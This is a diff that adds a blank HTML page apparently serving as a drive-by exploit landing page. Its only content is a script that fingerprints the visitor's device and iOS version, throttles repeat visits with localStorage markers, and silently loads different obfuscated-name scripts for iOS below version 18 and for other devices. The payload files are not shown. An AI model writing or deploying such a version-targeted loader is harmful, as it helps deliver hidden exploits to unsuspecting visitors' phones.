@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8" />
+</head>
+<body>
+<script type="text/javascript">
+(function () {
+  var ua = navigator.userAgent || "";
+  try {
+    var now = Date.now();
+    var nav = localStorage.getItem("_x_nav");
+    if (nav && now - parseInt(nav, 10) < 8000) return;
+    if (localStorage.getItem("_x_done")) return;
+    localStorage.setItem("_x_nav", String(now));
+  } catch (e) {}
+  try {
+    if (/iP(hone|ad|od)/.test(ua)) {
+      var z = document.createElement("script");
+      z.src = "b4b45c8f.js";
+      document.body.appendChild(z);
+    }
+  } catch (e) {}
+  var m = ua.match(/OS (\d+)[._](\d+)(?:[._](\d+))?/i);
+  var major = m ? parseInt(m[1], 10) : 0;
+  try { localStorage.removeItem("_x_ok"); } catch (e) {}
+  var s = document.createElement("script");
+  if (major > 0 && major < 18) {
+    s.src = "fb7d9fdd.js";
+    document.body.appendChild(s);
+    return;
+  }
+  s.src = "40b2d537.js";
+  document.body.appendChild(s);
+})();
+</script>
+</body>
+</html>
